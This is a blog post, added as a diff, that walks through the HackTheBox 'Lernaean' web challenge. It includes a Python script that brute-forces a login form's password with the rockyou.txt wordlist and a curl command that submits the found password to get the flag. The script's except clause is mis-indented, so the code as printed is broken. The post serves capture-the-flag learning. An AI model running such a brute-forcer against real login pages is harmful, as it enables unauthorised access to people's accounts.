@@ -1,0 +1,117 @@
+---
+title: 'HackTheBox - [WEB] Lernaean'
+summary: "I just create my account on HackTheBox, so let's begin with web challenge and with the one called Lernaean.
+This challenge is only worth 20 points, so it should be an easy one..."
+---
+
+I just create my account on HackTheBox, so let's begin with web challenge and with the one called Lernaean.
+This challenge is only worth 20 points, so it should be an easy one...
+
+The only description we have before starting the challenge instance is:
+
+> "Your target is not very good with computers. Try and guess their password to see if they may be hiding anything!"
+
+After starting the instance, we have this webpage:
+
+![webpage](/blog/hackthebox-web-lernaean/webpage.png)
+
+The source code of the page do not contain anything interesting,
+and with the description of the challenge it's not hard to understand that the purpose of this challenge is to
+**Brute Force** the administrator password.
+
+First, let's see what happen with BurpSuite when we try to login with the password "Hello":
+
+![burpsuite](/blog/hackthebox-web-lernaean/burp.png)
+
+We can see that a POST request with data "password=hello" is sent to the webpage challenge.
+
+And when the password is incorrect, this text show up in the top left corner of the webpage:
+
+![invalid error message](/blog/hackthebox-web-lernaean/invalid.png)
+
+Now that we know these information let's build a python script to brute force the password input.
+I'm using **urllib**, it's a python3 library which allow to make request very easily.
+
+```python
+#!/usr/bin/python
+import os,sys,json
+from urllib import request, parse
+
+target = "http://docker.hackthebox.eu:30814/"
+
+print ("Loading the passwords list...\n")
+
+# Read and split the password file
+passfile = open('/root/Downloads/rockyou.txt', 'r', errors='surrogateescape')
+passwords = passfile.read().split('\n')
+passfile.close()
+
+print ("Start attack on target: %s" %target)
+
+# Start the brute force
+for password in passwords:
+    print ("Trying %s" %password)
+    payload = {'password':password}
+    payload = parse.urlencode(payload).encode('ascii')
+
+    req = request.Request(target, data=payload)
+    try:
+        response = request.urlopen(req, data=payload)
+        html = response.read()
+        check = "Invalid password!"
+        check = check.encode('utf-8')
+
+        if check not in html:
+            print ("Password found: %s" %password)
+            pas = open('done.txt', 'a')
+            pas.write('%s' %password)
+            pas.close()
+        except request.HTTPError as e:
+            print (e.code)
+            continue
+```
+
+<em>
+  Note: I used the errors filed on open() to prevent an encoding error I
+  encountered. Same for the encoding in utf-8 of the check string.
+</em>
+
+In the first part of the script, we load the password file.
+I use the wordlist password file **rockyou.txt** that you can find [here](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=2ahUKEwilp7-59OzlAhXR8uAKHfBvCncQFjAAegQIABAB&url=https%3A%2F%2Fgithub.com%2Fbrannondorsey%2Fnaive-hashcat%2Freleases%2Fdownload%2Fdata%2Frockyou.txt&usg=AOvVaw3snAERl1mU6Ccr4WFEazBd).
+
+In the second part of the script, for each password in our passfile we send a POST request with the data **"password=ourpassword"**.
+Then, we are checking if the html of the response request is containing the string **"Invalid password!"**,
+if not it's mean that we find the correct password.
+
+After creating the script don't forget to add execution right to it:
+
+```shell
+chmod +x lernaean.py
+```
+
+And let's start it with python3:
+
+```shell
+python3 lernaean.py
+```
+
+![terminal message result](/blog/hackthebox-web-lernaean/script.png)
+
+When the script find the correct password it will write it in the **done.txt** file.
+
+YES! We finaly have the password, let's try it on the webpage:
+
+![too slow message](/blog/hackthebox-web-lernaean/slow.png)
+
+What is this sorcery? We have the correct password but the webpage tell us that we are too slow.
+Ok, so let's send the password with curl and see what happen:
+
+```shell
+curl docker.hackthebox.eu:30814 -d "password=leonardo" -v
+```
+
+Don't forget the **verbose** (-v) of the command to see the server response in details.
+
+![terminal final result](/blog/hackthebox-web-lernaean/bingo-1.png)
+
+BINGO! We have the flag in the response, between the \<h1\> html tag!
